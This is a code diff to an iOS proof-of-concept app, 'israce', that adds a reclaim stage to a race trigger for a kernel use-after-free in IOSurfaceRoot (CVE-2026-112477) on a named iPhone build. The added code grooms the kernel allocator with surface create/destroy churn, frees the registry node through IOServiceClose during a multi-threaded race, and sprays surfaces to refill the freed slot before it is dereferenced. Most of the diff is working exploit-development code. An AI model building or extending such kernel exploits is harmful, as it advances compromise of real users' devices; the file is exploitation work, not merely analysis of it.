@@ -1,4 +1,4 @@
-// israce v3: faithful trigger replication of the published iOS 27.0.1 IOSurfaceRoot
+// israce v3.6: adds the reclaim stage. Baseline trigger replication of the published iOS 27.0.1 IOSurfaceRoot
 // registry-node UAF (CVE-2026-112477) on iPhone18,5 / 24A446.
 // Method follows Kimi-2011's public research notes (github.com/Kimi-2011/ios27-iosurface-uaf,
 // out/RESEARCH-IOSURFACE-UAF.md): async sel17 register with wake port + ref, surface under
@@ -191,6 +191,80 @@ static int runPostclose(int iter) {
   return (rcs[2] == 0) ? 1 : 0;
 }
 
+
+// ---- v3.6 reclaim spray helpers ----
+static void freeSpray(void);
+// Small surfaces allocate several small kernel objects; create/destroy churn
+// shapes the allocator freelist so the race-freed node's slot gets refilled by
+// our own allocations before the registry walk dereferences it.
+static IOSurfaceRef_ *gSpray = NULL;
+static int gSprayN = 0;
+static int spraySurfaces(int n) {
+  freeSpray();
+  if (!pCreate) return -1;
+  gSpray = (IOSurfaceRef_ *)malloc(sizeof(IOSurfaceRef_) * n);
+  if (!gSpray) return -2;
+  int w = 1, h = 1, bpe = 4, pf = 0x42475241;
+  CFNumberRef W = CFNumberCreate(NULL, kCFNumberIntType, &w);
+  CFNumberRef H = CFNumberCreate(NULL, kCFNumberIntType, &h);
+  CFNumberRef B = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+  CFNumberRef P = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+  const void *vk[4] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                        CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
+  const void *vv[4] = { W, H, B, P };
+  CFDictionaryRef d = CFDictionaryCreate(NULL, vk, vv, 4, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+  int made = 0;
+  for (int i = 0; i < n; i++) { gSpray[i] = pCreate(d); if (gSpray[i]) made++; }
+  CFRelease(d); CFRelease(W); CFRelease(H); CFRelease(B); CFRelease(P);
+  gSprayN = n;
+  return made;
+}
+static void drainSpray(int keepStride) {
+  if (!gSpray) return;
+  for (int i = 0; i < gSprayN; i++)
+    if (gSpray[i] && (keepStride <= 1 || (i % keepStride) != 0)) { CFRelease(gSpray[i]); gSpray[i] = NULL; }
+}
+static void freeSpray(void) {
+  if (!gSpray) return;
+  for (int i = 0; i < gSprayN; i++) if (gSpray[i]) CFRelease(gSpray[i]);
+  free(gSpray); gSpray = NULL; gSprayN = 0;
+}
+
+// V_RECLAIM: groom (create 256, hole every other) -> race window identical to
+// lockdeg -> IOServiceClose (free point) -> immediate 256-surface reclaim spray,
+// no settle sleep -> join -> CFRelease(victim) is the walk point. If the reclaim
+// won the freed slot the walk reads sprayed allocations instead of dangling
+// memory; survive-with-spray vs panic is the signal. MTE tag consistency remains
+// the open blocker (Kimi's stated boundary).
+static int runReclaim(int iter, int nth) {
+  int groom = spraySurfaces(256);
+  if (groom < 0) return groom;
+  drainSpray(2);                 // keep every 2nd -> ~128 holes
+  io_connect_t c = 0; mach_port_t wp = newWakePort();
+  if (openConn(&c) != KERN_SUCCESS) { dropPort(wp); freeSpray(); return -100; }
+  kern_return_t r = regAsync(c, wp);
+  if (r != KERN_SUCCESS) { L(@"reclaim i%d reg rc=0x%x", iter, r); IOServiceClose(c); dropPort(wp); freeSpray(); return (int)r; }
+  IOSurfaceRef_ s = mkSurface();
+  if (!s) { IOServiceClose(c); dropPort(wp); freeSpray(); return -102; }
+  gRun = 1;
+  if (nth < 2) nth = 2; if (nth > 8) nth = 8;
+  pthread_t th[8];
+  for (int i = 0; i < nth; i++) pthread_create(&th[i], NULL, spamLock, s);
+  usleep(100 + (iter % 60) * 30);
+  IOServiceClose(c);             // free point
+  gOps++;
+  int spray = spraySurfaces(256); // reclaim: also frees the 128 groom survivors first, then refills
+  CKPT(@"reclaim-sprayed");
+  gRun = 0;
+  for (int i = 0; i < nth; i++) pthread_join(th[i], NULL);
+  CFRelease(s);                   // walk point
+  gOps++;
+  L(@"reclaim i%d groom=%d spray=%d nth=%d survived", iter, groom, spray, nth);
+  dropPort(wp);
+  freeSpray();
+  return (spray > 0) ? 1 : 0;
+}
+
 static void loadDone(void) {
   NSString *p = [gDoc stringByAppendingPathComponent:@"israce.ndjson"];
   NSString *s = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
@@ -227,6 +301,7 @@ static void runAll(void) {
   }
   CKPT(@"calib-done");
   struct { int v, it; const char *tag; } plan[] = {
+    { 3, 12,  "reclaim" },
     { 2, 40,  "postclose" },
     { 0, 200, "lockdeg" },
     { 1, 100, "race1" },
@@ -236,7 +311,7 @@ static void runAll(void) {
     noteEvent(@"pass", [NSString stringWithFormat:@",\"pass\":%d,\"lt\":%d,\"rt\":%d", gPass, 2 + (gPass % 5), 4 + (gPass % 5)]);
     for (int p = 0; p < nplan; p++) {
       int iterBase = gPass * 37;
-      int nth = (plan[p].v == 0) ? (2 + (gPass % 5)) : (plan[p].v == 1) ? (4 + (gPass % 5)) : 4;
+      int nth = (plan[p].v == 0 || plan[p].v == 3) ? (2 + (gPass % 5)) : (plan[p].v == 1) ? (4 + (gPass % 5)) : 4;
       for (int i = 0; i < plan[p].it; i++) {
         if (gStop || nowSec() > kStartBudget) {
           noteEvent(@"budget", [NSString stringWithFormat:@",\"pass\":%d,\"at\":\"%s-%d\",\"t\":%.2f", gPass, plan[p].tag, i, nowSec()]);
@@ -254,6 +329,7 @@ static void runAll(void) {
         @autoreleasepool {
           if (plan[p].v == 0) rc = runLockdeg(jit, nth);
           else if (plan[p].v == 1) rc = runRace1(jit, nth);
+          else if (plan[p].v == 3) rc = runReclaim(jit, nth);
           else rc = runPostclose(i);
         }
       uint64_t ms = (nowNs() - t0) / 1000000ull;
@@ -282,13 +358,13 @@ static void runAll(void) {
   // v3.3: fsync the Documents DIRECTORY once so the files' directory entries are durable across a kernel reset
   { int dfd = open([gDoc UTF8String], O_RDONLY); if (dfd >= 0) { fsync(dfd); close(dfd); } }
   CKPT(@"launch");
-  L(@"probe v3.5 sweep start t=%.3f doc=%@", nowSec(), gDoc);
+  L(@"probe v3.6 sweep start t=%.3f doc=%@", nowSec(), gDoc);
   self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
   UIViewController *root = [UIViewController new];
   root.view.backgroundColor = [UIColor blackColor];
   CGRect b = UIScreen.mainScreen.bounds;
   UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(16, 80, b.size.width - 32, b.size.height - 160)];
-  lab.text = @"israce v3.5 sweep\n64 passes x 340 cases\nphone may reboot if it hits";
+  lab.text = @"israce v3.6 reclaim\n64 passes + reclaim stage\nphone may reboot if it hits";
   lab.textColor = [UIColor greenColor];
   lab.numberOfLines = 0;
   lab.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
@@ -319,7 +395,7 @@ static void runAll(void) {
       if (!gSvc) { noteEvent(@"abort", @",\"why\":\"no IOSurfaceRoot service\""); self.label.text = @"no IOSurfaceRoot service"; return; }
       runAll();
       if (!gStop) {
-        L(@"probe v3 END (sweep done) passes=%d ok=%d ends=%d", gPass, gOK, gEnds);
+        L(@"probe v3.6 END (sweep done) passes=%d ok=%d ends=%d", gPass, gOK, gEnds);
         noteEvent(@"summary", [NSString stringWithFormat:@",\"ran\":%d,\"ends\":%d,\"ok\":%d,\"passes\":%d,\"t\":%.2f", gCaseRan, gEnds, gOK, gPass, nowSec()]);
         self.label.text = [NSString stringWithFormat:@"sweep done\n%d passes, ran %d ok %d\n%.1fs", gPass, gCaseRan, gOK, nowSec()];
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ exit(0); });
